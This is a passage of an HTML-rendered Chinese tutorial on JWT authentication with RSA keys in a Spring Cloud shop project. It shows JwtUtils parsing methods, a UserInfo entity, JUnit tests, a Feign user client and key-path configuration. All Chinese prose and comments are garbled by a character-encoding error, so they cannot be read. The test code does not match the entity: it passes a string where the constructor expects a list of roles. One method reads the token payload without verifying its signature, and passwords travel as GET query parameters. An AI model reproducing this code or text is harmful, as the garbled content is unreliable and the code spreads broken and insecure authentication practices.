*</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     ç”¨æˆ·è¯·æ±‚ä¸­çš„token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKey å…¬é’¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Jws&lt;Claims&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Jws&lt;Claims&gt; <span class="title function_">parserToken</span><span class="params">(String token, PublicKey publicKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.parser().setSigningKey(publicKey).parseClaimsJws(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createJTI</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(UUID.randomUUID().toString().getBytes()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–tokenä¸­çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¸”éªŒè¯tokenæ˜¯å¦æœ‰æ•ˆã€æ˜¯å¦è¿‡æœŸ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     ç”¨æˆ·è¯·æ±‚ä¸­çš„ä»¤ç‰Œ</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKey å…¬é’¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userType è½½è·ä¸­çš„ç”¨æˆ·æ•°æ®çš„ç±»å‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Payload&lt;T&gt; <span class="title function_">getInfoFromToken</span><span class="params">(String token, PublicKey publicKey, Class&lt;T&gt; userType)</span> &#123;</span><br><span class="line">        Jws&lt;Claims&gt; claimsJws = parserToken(token, publicKey);</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">body</span> <span class="operator">=</span> claimsJws.getBody();</span><br><span class="line">        Payload&lt;T&gt; claims = <span class="keyword">new</span> <span class="title class_">Payload</span>&lt;&gt;();</span><br><span class="line">        claims.setId(body.getId());</span><br><span class="line">        <span class="keyword">if</span>(userType == String.class)&#123;</span><br><span class="line">            claims.setUserInfo((T) body.get(JWT_PAYLOAD_USER_KEY).toString());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            claims.setUserInfo(JsonUtils.toBean(body.get(JWT_PAYLOAD_USER_KEY).toString(), userType));</span><br><span class="line">        &#125;</span><br><span class="line">        claims.setExpiration(body.getExpiration());</span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–tokenä¸­çš„IDä¿¡æ¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     ç”¨æˆ·è¯·æ±‚ä¸­çš„ä»¤ç‰Œ</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKey å…¬é’¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getIdFromToken</span><span class="params">(String token, PublicKey publicKey)</span> &#123;</span><br><span class="line">        Jws&lt;Claims&gt; claimsJws = parserToken(token, publicKey);</span><br><span class="line">        <span class="keyword">return</span> claimsJws.getBody().getId();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Decoder&lt;String, <span class="type">byte</span>[]&gt; stringDecoder = Decoders.BASE64URL;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–tokenä¸­çš„è½½è·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     ç”¨æˆ·è¯·æ±‚ä¸­çš„ä»¤ç‰Œ</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Payload&lt;T&gt; <span class="title function_">getInfoFromToken</span><span class="params">(String token, Class&lt;T&gt; userType)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadStr</span> <span class="operator">=</span> StringUtils.substringBetween(token, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = stringDecoder.decode(payloadStr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; map = JsonUtils.toMap(json, String.class, String.class);</span><br><span class="line">        Payload&lt;T&gt; claims = <span class="keyword">new</span> <span class="title class_">Payload</span>&lt;&gt;();</span><br><span class="line">        claims.setId(map.get(<span class="string">&quot;jti&quot;</span>));</span><br><span class="line">        claims.setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(Long.valueOf(map.getOrDefault(<span class="string">&quot;exp&quot;</span>, <span class="string">&quot;0&quot;</span>))));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(userType == String.class)&#123;</span><br><span class="line">            claims.setUserInfo((T) map.get(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            claims.setUserInfo(JsonUtils.toBean(map.get(<span class="string">&quot;user&quot;</span>), userType));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><h4 id="ç”¨æˆ·ä¿¡æ¯"><a href="#ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯"></a>ç”¨æˆ·ä¿¡æ¯</h4><p>è¿™é‡Œæˆ‘ä»¬å‡è®¾ç”¨æˆ·ä¿¡æ¯åŒ…å«3éƒ¨åˆ†ï¼š</p>
<ul>
<li>idï¼šç”¨æˆ·id</li>
<li>usernameï¼šç”¨æˆ·å</li>
<li>roleï¼šè§’è‰²ï¼ˆæƒé™ä¸­ä¼šä½¿ç”¨ï¼‰</li>
</ul>
<p>è½½è·:UserInfo</p>
<p>åœ¨<code>ly-common</code>çš„<code>com.leyou.common.entity</code>åŒ…ä¸‹æ·»åŠ ä¸€ä¸ªå®ä½“ç±»ï¼Œä»£è¡¨ç”¨æˆ·ä¿¡æ¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; role;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInfo</span><span class="params">(Long id, String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInfo</span><span class="params">(Long id, String username, List&lt;String&gt; role)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.role = role;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="æµ‹è¯•ç±»"><a href="#æµ‹è¯•ç±»" class="headerlink" title="æµ‹è¯•ç±»"></a>æµ‹è¯•ç±»</h4><p>æˆ‘ä»¬åœ¨<code>ly-common</code>ä¸­ç¼–å†™æµ‹è¯•ç±»ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022676.png" alt="1554612391707"> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.utils.RsaUtils;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">privateFilePath</span> <span class="operator">=</span> <span class="string">&quot;C:\\develop\\ssh\\id_rsa&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">publicFilePath</span> <span class="operator">=</span> <span class="string">&quot;C:\\develop\\ssh\\id_rsa.pub&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testRSA</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ç”Ÿæˆå¯†é’¥å¯¹</span></span><br><span class="line">        RsaUtils.generateKey(publicFilePath, privateFilePath, <span class="string">&quot;hello&quot;</span>, <span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–ç§é’¥</span></span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> RsaUtils.getPrivateKey(privateFilePath);</span><br><span class="line">        System.out.println(<span class="string">&quot;privateKey = &quot;</span> + privateKey);</span><br><span class="line">        <span class="comment">// è·å–å…¬é’¥</span></span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> RsaUtils.getPublicKey(publicFilePath);</span><br><span class="line">        System.out.println(<span class="string">&quot;publicKey = &quot;</span> + publicKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJWT</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è·å–ç§é’¥</span></span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> RsaUtils.getPrivateKey(privateFilePath);</span><br><span class="line">        <span class="comment">// ç”Ÿæˆtoken</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateTokenExpireInSeconds(<span class="keyword">new</span> <span class="title class_">UserInfo</span>(<span class="number">1L</span>, <span class="string">&quot;Jack&quot;</span>, <span class="string">&quot;guest&quot;</span>), privateKey, <span class="number">5</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;token = &quot;</span> + token);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–å…¬é’¥</span></span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> RsaUtils.getPublicKey(publicFilePath);</span><br><span class="line">        <span class="comment">// è§£ætoken</span></span><br><span class="line">        Payload&lt;UserInfo&gt; info = JwtUtils.getInfoFromToken(token, publicKey, UserInfo.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;info.getExpiration() = &quot;</span> + info.getExpiration());</span><br><span class="line">        System.out.println(<span class="string">&quot;info.getUserInfo() = &quot;</span> + info.getUserInfo());</span><br><span class="line">        System.out.println(<span class="string">&quot;info.getId() = &quot;</span> + info.getId());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="æˆæƒä¸­å¿ƒ"><a href="#æˆæƒä¸­å¿ƒ" class="headerlink" title="æˆæƒä¸­å¿ƒ"></a>æˆæƒä¸­å¿ƒ</h2><p>æˆæƒä¸­å¿ƒçš„ä¸»è¦èŒè´£ï¼š</p>
<ul>
<li>ç”¨æˆ·ç™»å½•é‰´æƒ(Login)ï¼š<ul>
<li>æ¥æ”¶ç”¨æˆ·çš„ç™»å½•è¯·æ±‚ï¼Œ</li>
<li>é€šè¿‡ç”¨æˆ·ä¸­å¿ƒçš„æ¥å£æ ¡éªŒç”¨æˆ·åå¯†ç </li>
<li>ä½¿ç”¨ç§é’¥ç”ŸæˆJWTå¹¶è¿”å›</li>
</ul>
</li>
<li>ç”¨æˆ·ç™»å½•çŠ¶æ€æ ¡éªŒ<ul>
<li>åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œå…¶å®å°±æ˜¯tokençš„æ ¡éªŒ</li>
</ul>
</li>
<li>ç”¨æˆ·ç™»å‡º<ul>
<li>ç”¨æˆ·é€‰æ‹©é€€å‡ºç™»å½•åï¼Œè¦è®©tokenå¤±æ•ˆ</li>
</ul>
</li>
<li>ç”¨æˆ·ç™»å½•çŠ¶æ€åˆ·æ–°<ul>
<li>ç”¨æˆ·ç™»å½•ä¸€æ®µæ—¶é—´åï¼ŒJWTå¯èƒ½è¿‡æœŸï¼Œéœ€è¦åˆ·æ–°æœ‰æ•ˆæœŸ</li>
</ul>
</li>
</ul>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€ä¸€å®Œæˆä¸Šè¿°åŠŸèƒ½</p>
<h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>æˆ‘ä»¬åœ¨å®ç°ç™»å½•çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„å‡ ä¸ªä¸œè¥¿ï¼š</p>
<ul>
<li>å»ç”¨æˆ·å¾®æœåŠ¡ly-useræŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯</li>
<li>éœ€è¦ç§˜é’¥ç”¨æ¥ç”Ÿæˆç­¾å</li>
</ul>
<p>å› æ­¤æœ‰å‡ ä¸ªé—®é¢˜éœ€è¦æˆ‘ä»¬å»è§£å†³ï¼š</p>
<ul>
<li><strong>ly-userå¿…é¡»å¯¹å¤–æä¾›çš„æ¥å£</strong>ï¼Œæ ¹æ®ç”¨æˆ·åå’Œå¯†ç æŸ¥è¯¢ç”¨æˆ·ã€‚</li>
<li>æˆæƒä¸­å¿ƒéœ€è¦å…¬é’¥å’Œç§é’¥ï¼Œå¿…é¡»æ˜¯åœ¨<strong>é¡¹ç›®å¯åŠ¨æ—¶å°±åŠ è½½</strong>å…¬é’¥å’Œç§é’¥å¯¹è±¡åˆ°å®¹å™¨ä¸­</li>
</ul>
<h4 id="æŸ¥è¯¢ç”¨æˆ·æ¥å£"><a href="#æŸ¥è¯¢ç”¨æˆ·æ¥å£" class="headerlink" title="æŸ¥è¯¢ç”¨æˆ·æ¥å£"></a>æŸ¥è¯¢ç”¨æˆ·æ¥å£</h4><h5 id="å®šä¹‰æ¥å£"><a href="#å®šä¹‰æ¥å£" class="headerlink" title="å®šä¹‰æ¥å£"></a>å®šä¹‰æ¥å£</h5><p>ç”¨æˆ·ä¸­å¿ƒå¿…é¡»å¯¹å¤–æä¾›æŸ¥è¯¢æ¥å£ï¼Œæ–¹ä¾¿ly-authåšç”¨æˆ·åå¯†ç æ ¡éªŒã€‚</p>
<p>é¦–å…ˆåœ¨<code>ly-user-api</code>å®šä¹‰æ¥å£ï¼š</p>
<p>å¼•å…¥Feignä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-openfeign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨<code>ly-user-api</code>çš„<code>com.leyou.user.client</code>ä¸­ï¼Œæ·»åŠ æ¥å£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.user.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.user.dto.UserDTO;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@FeignClient(&quot;user-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserClient</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ®ç”¨æˆ·åå’Œå¯†ç æŸ¥è¯¢ç”¨æˆ·</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username ç”¨æˆ·å</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password å¯†ç </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;info&quot;)</span></span><br><span class="line">    UserDTO <span class="title function_">queryUserByUsernameAndPassword</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ly-authå¼•ç”¨æ¥å£"><a href="#ly-authå¼•ç”¨æ¥å£" class="headerlink" title="ly-authå¼•ç”¨æ¥å£"></a>ly-authå¼•ç”¨æ¥å£</h5><p>ç„¶åï¼Œåœ¨ly-auth-serviceä¸­å¼•å…¥ly-user-interfaceå’Œfeignçš„ä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-user-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>ly-auth</code>çš„<code>com.leyou.auth</code>åŒ…ä¸‹çš„å¯åŠ¨ç±»<code>LyAuthApplication</code>ä¸Šæ·»åŠ æ³¨è§£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(basePackages = &quot;com.leyou.user.client&quot;)</span></span><br><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;com.leyou.auth&quot;, &quot;com.leyou.common.advice&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LyAuthApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(LyAuthApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šå¯¹<code>FeignClient</code>çš„æ‰«æåŒ…è¦æ·»åŠ åˆ°<code>@EnableFeignClients</code>æ³¨è§£é‡Œé¢ï¼</p>
<h4 id="è¯»å–å…¬é’¥å’Œç§é’¥"><a href="#è¯»å–å…¬é’¥å’Œç§é’¥" class="headerlink" title="è¯»å–å…¬é’¥å’Œç§é’¥"></a>è¯»å–å…¬é’¥å’Œç§é’¥</h4><h5 id="ç¼–å†™é…ç½®"><a href="#ç¼–å†™é…ç½®" class="headerlink" title="ç¼–å†™é…ç½®"></a>ç¼–å†™é…ç½®</h5><p>æˆ‘ä»¬éœ€è¦åœ¨æˆæƒä¸­å¿ƒ<code>ly-uath-service</code>å®Œæˆæˆæƒï¼Œè‚¯å®šè¦ç”¨åˆ°å…¬é’¥ã€ç§é’¥ã€è¿˜æœ‰JWTå·¥å…·ï¼Œå¿…é¡»çŸ¥é“å…¬é’¥ã€ç§é’¥æ–‡ä»¶çš„ä½ç½®ï¼Œå¦å¤–ç”Ÿæˆtokençš„æœ‰æ•ˆæœŸç­‰ä¿¡æ¯ï¼Œè¿™äº›å¯ä»¥é…ç½®åˆ°<code>application.yml</code>ä¸­ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="comment"># ..</span></span><br><span class="line">  <span class="attr">jwt:</span></span><br><span class="line">    <span class="attr">pubKeyPath:</span> <span class="string">C:/develop/ssh/id_rsa.pub</span> <span class="comment"># å…¬é’¥åœ°å€</span></span><br><span class="line">    <span class="attr">priKeyPath:</span> <span class="string">C:/develop/ssh/id_rsa</span> <span class="comment"># ç§é’¥åœ°å€</span></span><br></pre></td></tr></table></figure>

<h5 id="å±æ€§è¯»å–"><a href="#å±æ€§è¯»å–" class="headerlink" title="å±æ€§è¯»å–"></a>å±æ€§è¯»å–</h5><p>ç„¶åç¼–å†™å±æ€§ç±»ï¼ŒåŠ è½½è¿™äº›æ•°æ®ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ly.jwt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtProperties</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String pubKeyPath;</span><br><span class="line">    <span class="keyword">private</span> String priKeyPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="åŠ è½½å…¬é’¥å’Œç§é’¥"><a href="#åŠ è½½å…¬é’¥å’Œç§é’¥" class="headerlink" title="åŠ è½½å…¬é’¥å’Œç§é’¥"></a>åŠ è½½å…¬é’¥å’Œç§é’¥</h5><p>æ€è€ƒä¸€ä¸‹ï¼šè¿™ä¸ªå±æ€§ç±»åªå¸®æˆ‘ä»¬è¯»å–äº†å…¬é’¥å’Œç§é’¥çš„åœ°å€ï¼Œé‚£ä¹ˆæ¯æ¬¡ä½¿ç”¨å…¬é’¥æˆ‘ä»¬éƒ½éœ€è¦ä»ç¡¬ç›˜è¯»å–ï¼Œæ•ˆç‡æ˜¯ä¸æ˜¯å¤ªä½äº†ï¼Œèƒ½ä¸èƒ½åœ¨è¿™ä¸ªç±»ä¸­ï¼Œç›´æ¥è¯»å–å…¬é’¥å’Œç§é’¥ï¼Œä¿å­˜èµ·æ¥ï¼Œä¾›ä»¥åä½¿ç”¨å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹ã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<strong>åŠ è½½å…¬é’¥å’Œç§é’¥çš„ä»£ç åº”è¯¥å†™åœ¨å“ªé‡Œå‘¢ï¼Ÿæ„é€ å‡½æ•°å¯ä»¥å—ï¼Ÿ</strong></p>
<p>æ˜¾ç„¶ä¸è¡Œï¼Œå› ä¸ºæ„é€ å‡½æ•°æ‰§è¡Œæ—¶ï¼ŒSpringè¿˜æ²¡æœ‰å®Œæˆå±æ€§æ³¨å…¥ï¼Œæ­¤æ—¶pubKeyPathå’ŒpriKeyPathéƒ½æ²¡æœ‰å€¼ï¼Œæˆ‘ä»¬**<code>å¿…é¡»åœ¨Springå®Œæˆå±æ€§æ³¨å…¥åå†åŠ è½½å¯†é’¥</code>**ã€‚</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•çŸ¥é“Springå®Œæˆäº†å±æ€§æ³¨å…¥å‘¢ï¼Ÿ</p>
<p>è¿™å°±å¿…é¡»è¦çŸ¥é“Springçš„Beanåˆå§‹åŒ–ç”Ÿå‘½å‘¨æœŸäº†ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022677.png" alt="1554617122160"></p>
<p>Spring Beanåœ¨Spring Bean Factory Containerä¸­å®Œæˆå…¶æ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼šä»¥ä¸‹æ˜¯å®Œæˆå…¶ç”Ÿå‘½å‘¨æœŸæ‰€éœ€çš„å„ç§å†…å®¹ï¼š</p>
<ol>
<li>Springå®¹å™¨ä»XMLæ–‡ä»¶æˆ–@Configurationä¸­beançš„å®šä¹‰ä¸­å®ä¾‹åŒ–beanã€‚</li>
<li>Springä¾æ®é…ç½®ä¸­æŒ‡å®šçš„å±æ€§ï¼Œä¸ºbeanå¡«å……æ‰€æœ‰å±æ€§ã€‚</li>
<li>å¦‚æœbeanå®ç°BeanNameAwareæ¥å£ï¼Œspringè°ƒç”¨setBeanName()æ–¹æ³•ï¼Œå¹¶ä¼ é€’beançš„idã€‚</li>
<li>å¦‚æœbeanå®ç°BeanFactoryAwareæ¥å£ï¼Œspringå°†è°ƒç”¨setBeanFactory()æ–¹æ³•ï¼Œå¹¶æŠŠè‡ªå·±ä½œä¸ºå‚æ•°ã€‚</li>
<li>å¦‚æœbeanå®ç°ApplicationContextAwareæ¥å£ï¼Œspringå°†è°ƒç”¨setApplicationContext()æ–¹æ³•ï¼Œå¹¶æŠŠApplicationContextå®ä¾‹ä½œä¸ºå‚æ•°ã€‚</li>
